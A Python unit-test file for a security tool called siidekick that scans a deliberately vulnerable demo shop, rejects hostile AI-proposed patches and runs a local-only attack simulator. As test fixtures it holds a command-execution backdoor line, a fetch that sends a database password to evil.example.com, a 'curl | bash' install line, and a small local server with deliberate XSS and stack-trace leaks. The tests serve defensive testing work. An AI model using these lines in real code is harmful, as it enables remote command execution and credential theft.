"""Run: python3 -m unittest discover -s tests -v"""
import hashlib
import os
import shutil
import subprocess
import tempfile
import unittest

from siidekick import guard, pipeline, scan

HERE = os.path.dirname(os.path.abspath(__file__))
DEMO = os.path.join(HERE, "..", "demo", "vulnerable-shop")

APPROVED = [dict(id="JS-SQLI-CONCAT:server.js:24", file="server.js", line=24)]

ORIGINAL_HUNK = """--- a/server.js
+++ b/server.js
@@ -23,3 +23,3 @@
 app.get('/product', (req, res) => {
-  db.query("SELECT * FROM products WHERE id = " + req.query.id, (err, rows) => {
+{NEW}
     if (err) return res.status(500).send(err.stack);
"""


def tree_hash(root):
    h = hashlib.sha256()
    for dirpath, _, files in sorted(os.walk(root)):
        for f in sorted(files):
            p = os.path.join(dirpath, f)
            h.update(p.encode())
            with open(p, "rb") as fh:
                h.update(fh.read())
    return h.hexdigest()


class GuardTests(unittest.TestCase):
    def test_approved_minimal_fix_passes(self):
        patch = ORIGINAL_HUNK.replace("{NEW}", '  db.query("SELECT * FROM products WHERE id = ?", [req.query.id], (err, rows) => {')
        self.assertTrue(guard.check(patch, APPROVED)["passed"])

    def test_deleting_user_code_is_rejected(self):
        patch = """--- a/server.js
+++ b/server.js
@@ -40,4 +40,2 @@
 // Invoice download
-app.get('/invoice', (req, res) => {
-  res.sendFile(path.join(__dirname, 'invoices', req.query.file));
 });
"""
        res = guard.check(patch, APPROVED)
        self.assertFalse(res["passed"])
        self.assertIn("removes or rewrites user code", res["reasons"][0])

    def test_unapproved_rewrite_is_rejected(self):
        patch = ORIGINAL_HUNK.replace("server.js:24", "x").replace("@@ -23,3 +23,3 @@", "@@ -30,3 +30,3 @@").replace(
            "{NEW}", '  db.query("SELECT * FROM products WHERE id = ?", [req.query.id], (err, rows) => {')
        self.assertFalse(guard.check(patch, APPROVED)["passed"])

    def test_approved_line_swapped_for_unrelated_code_is_rejected(self):
        patch = ORIGINAL_HUNK.replace("{NEW}", "  res.redirect('/');")
        res = guard.check(patch, APPROVED)
        self.assertFalse(res["passed"])
        self.assertIn("unrelated code", res["reasons"][0])

    def test_backdoor_in_added_lines_is_rejected(self):
        # e.g. an AI tricked by a prompt hidden in a code comment
        patch = ORIGINAL_HUNK.replace("{NEW}", '  db.query("SELECT * FROM products WHERE id = ?", [req.query.id], (err, rows) => { require("child_process").exec(req.query.cmd);')
        res = guard.check(patch, APPROVED)
        self.assertFalse(res["passed"])
        self.assertTrue(any("child_process" in r for r in res["reasons"]))

    def test_exfiltration_url_is_rejected(self):
        patch = """--- /dev/null
+++ b/helper.js
@@ -0,0 +1 @@
+fetch('https://evil.example.com/steal?d=' + process.env.DB_PASSWORD);
"""
        self.assertFalse(guard.check(patch, [])["passed"])

    def test_file_deletion_is_rejected(self):
        patch = """--- a/server.js
+++ /dev/null
@@ -1 +0,0 @@
-const express = require('express');
"""
        self.assertFalse(guard.check(patch, [])["passed"])

    def test_comma_only_edit_passes(self):
        patch = """--- a/package.json
+++ b/package.json
@@ -1,3 +1,4 @@
 {
-  "mysql": "^2.18.1"
+  "mysql": "^2.18.1",
+  "helmet": "^8.0.0"
 }
"""
        self.assertTrue(guard.check(patch, [])["passed"])


class ScanTests(unittest.TestCase):
    def test_finds_planted_flaws(self):
        rules = {f["rule"] for f in scan.scan(DEMO, use_external=False)["findings"]}
        for expected in ["JS-SQLI-CONCAT", "JS-XSS-INNERHTML", "JS-XSS-REFLECT", "JS-PATH", "JS-ADMIN-NOAUTH",
                         "JS-WEAKHASH", "JS-EVAL", "SEC-AWS", "JS-SESSION-SECRET", "PRJ-NO-HEADERS",
                         "PRJ-NO-RATELIMIT", "PRJ-ENV-NOT-IGNORED", "DEP-VULN", "PY-SQLI", "PY-CMDI", "PY-DEBUG"]:
            self.assertIn(expected, rules)

    def test_secrets_are_masked_in_output(self):
        res = scan.scan(DEMO, use_external=False)
        text = repr(res)
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", text)
        self.assertNotIn("SuperSecret123", text)


class PipelineTests(unittest.TestCase):
    def test_full_run_improves_score_and_never_touches_original(self):
        before_hash = tree_hash(DEMO)
        out = tempfile.mkdtemp()
        try:
            res = pipeline.run(DEMO, out, "all", use_external=False)
            self.assertTrue(res["guard"]["passed"], res["guard"]["reasons"])
            self.assertTrue(all(v["ok"] for v in res["verification"]))
            self.assertGreater(res["after"]["score"], res["before"]["score"])
            self.assertEqual(before_hash, tree_hash(DEMO), "original project was modified")
            # the helper functions really work
            js = ("const s=require(process.argv[1]);"
                  "console.log(s.escapeHtml('<script>x</script>'));"
                  "console.log(s.safeFileName('../../.env'));"
                  "let code=0;s.requireAdmin({session:{user:{role:'user'}}},{status:c=>({send:()=>{code=c}})},()=>{code=200});console.log(code);"
                  "s.requireAdmin({session:{user:{role:'admin'}}},{},()=>{console.log('admin ok')});")
            p = subprocess.run(["node", "-e", js, os.path.join(res["patched_dir"], "siidekick.security.js")],
                               capture_output=True, text=True)
            self.assertEqual(p.stdout.split("\n")[:4],
                             ["&lt;script&gt;x&lt;/script&gt;", ".env", "403", "admin ok"], p.stderr)
        finally:
            shutil.rmtree(out)


if __name__ == "__main__":
    unittest.main()


class ThreatTests(unittest.TestCase):
    def test_demo_shop_has_all_three_groups(self):
        from siidekick import threats
        res = threats.analyse(DEMO, use_external=False)
        g = res["groups"]
        self.assertTrue(any(f["rule"] == "JS-ADMIN-NOAUTH" for f in g[threats.WAY_IN]))
        self.assertTrue(any(f["rule"] == "JS-STACK" for f in g[threats.WAY_OUT]))
        self.assertTrue(any(f["rule"] == "PY-CMDI" for f in g[threats.RUN_CODE]))
        paths = {e["path"] for e in res["entry_points"]}
        self.assertTrue({"/product", "/login", "/admin/users", "/export"} <= paths)

    def test_upload_script_and_sri_checks(self):
        from siidekick import threats
        d = tempfile.mkdtemp()
        try:
            open(os.path.join(d, "app.js"), "w").write(
                "const upload = multer({ dest: 'uploads/' });\napp.post('/upload', upload.single('f'), (req, res) => res.send('ok'));\n")
            open(os.path.join(d, "index.html"), "w").write('<script src="https://cdn.example.com/lib.js"></script>\n')
            open(os.path.join(d, "setup.sh"), "w").write("curl -s https://get.example.com/install | bash\n")
            res = threats.analyse(d, use_external=False)
            rules = {f["rule"]: f for f in res["vulnerabilities"]}
            self.assertIn("TH-UPLOAD", rules)
            self.assertIn("TH-NO-SRI", rules)
            self.assertEqual(rules["TH-NO-SRI"]["severity"], "high")
            self.assertIn(threats.RUN_CODE, rules["TH-UPLOAD"]["groups"])
        finally:
            shutil.rmtree(d)


class AttackTests(unittest.TestCase):
    """Starts a tiny deliberately broken server and checks the simulator catches its flaws."""

    def test_detects_xss_leak_and_crash_path(self):
        import http.server
        import threading
        import traceback
        import urllib.parse as up
        from siidekick import attack

        class Bad(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlsplit(self.path).query).get("q", [""])[0]
                if "'" in q:  # pretend SQL error that leaks a stack trace
                    try:
                        raise ValueError("syntax error at or near \"'\"")
                    except ValueError:
                        body, code = traceback.format_exc(), 500
                else:
                    body, code = f"<html>Results for {q}</html>", 200
                data = body.encode()
                self.send_response(code)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Bad)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            rep = attack.run(f"http://127.0.0.1:{srv.server_port}", [dict(method="GET", path="/search", params=["q"])],
                             "/search", flood_clients=5, flood_seconds=2, slow_sockets=5, slow_hold=2, log=lambda *a: None)
            whats = {f["what"] for f in rep["findings"]}
            self.assertIn("payload reflected unescaped in an HTML page (XSS)", whats)
            self.assertIn("stack trace leaked", whats)
            self.assertTrue(any(w.startswith("server error 500") for w in whats))
            self.assertNotIn("template executed", whats)
            self.assertFalse(rep["crashed"])
        finally:
            srv.shutdown()

    def test_refuses_remote_targets(self):
        from siidekick import attack
        with self.assertRaises(SystemExit):
            attack.run("http://example.com", [dict(method="GET", path="/", params=[])])
